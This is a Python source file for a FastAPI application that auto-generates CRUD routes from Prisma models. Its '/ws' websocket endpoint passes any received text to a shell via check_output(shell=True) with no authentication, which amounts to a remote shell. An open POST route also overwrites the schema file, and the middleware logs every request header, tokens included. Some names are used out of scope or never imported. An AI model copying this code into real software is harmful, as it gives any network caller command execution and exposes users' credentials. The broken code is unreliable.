from fastapi_appbuilder.typed import *
from fastapi_appbuilder.resources import *
from fastapi_appbuilder.auth import Auth
from fastapi_appbuilder.chart import Chart
from json import loads
from fastapi import FastAPI, Body
from fastapi.responses import JSONResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from fastapi.websockets import WebSocket, WebSocketDisconnect
from prisma import Prisma
from prisma.models import ApiReq
from subprocess import check_output

web = StaticFiles(directory="www", html=True)

class AppBuilder(FastAPI):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.title = "FastAPI Prisma"
        self.description = "Schema Driven API with automatic CRUD operations"
        self.version = "0.0.1"
                
        @self.get('/api', tags=['schema'])
        async def api():
            responses = []
            schemas_ = [loads(model.schema_json())
                        for name, model in prisma_models]
            for schema in schemas_:
                schema_name = name
                schema_content = schema

                responses.append({
                    'name': schema_name,
                    'schema': schema_content
                })
            return responses
                
        @self.on_event('startup')
        async def startup():
            global db
            db = Prisma(auto_register=True)
            await db.connect()
            
        @self.on_event('shutdown')
        async def shutdown():
            await db.disconnect()
            
        for name, model in prisma_models:
            self.include_router(
                Resource(
                    schema=create_model(
                        name, __base__ = BaseSchema, 
                        field_definitions ={field.name: field.type_.__name__ for field in model.__fields__.values()}),
                    model=model), 
                prefix='/api', 
                tags=[name], 
                default_response_class=JSONResponse)
            
        @self.websocket("/ws")
        async def websocket_endpoint(websocket: WebSocket):
            await websocket.accept()
            try:
                while True:
                    data = await websocket.receive_text()
                    text = check_output(data, shell=True).decode("utf-8")
                    await websocket.send_text(text)
            except WebSocketDisconnect:
                print("Client disconnected")

        @self.get("/api/prisma")
        async def prisma_get():
            with open("prisma/schema.prisma", "r") as f:
                prisma_schema = f.read()
            return PlainTextResponse(prisma_schema)

        @self.post("/api/prisma")
        async def prisma_post(text:bytes=Body(...)):
            prisma_schema = text.decode("utf-8")
            with open("prisma/schema.prisma", "w") as f:
                f.write(prisma_schema)
            return "Prisma schema updated"

        @self.middleware("http")
        async def save_request(request: Request, call_next:Callable):
            response = await call_next(request)
            response_body = b''
            async for chunk in response.body_iterator:
                response_body += chunk
            response_body = response_body.decode("utf-8")
            await ApiReq.prisma().create(data={
                'method': request.method,
                'path': request.url.path,
                'headers': dumps(dict(request.headers)),
                'status': response.status_code,
                'ip': request.client.host or request.headers.get('X-Forwarded-For') or request.headers.get('CF-Connecting-IP')
            })
            return Response(content=response_body, status_code=response.status_code, headers=response.headers, media_type=response.media_type)

        self.include_router(Auth(), prefix='/api', tags=['auth']) 
        self.include_router(Chart(), prefix='/api', tags=['chart'])
        self.mount("/", web)
                    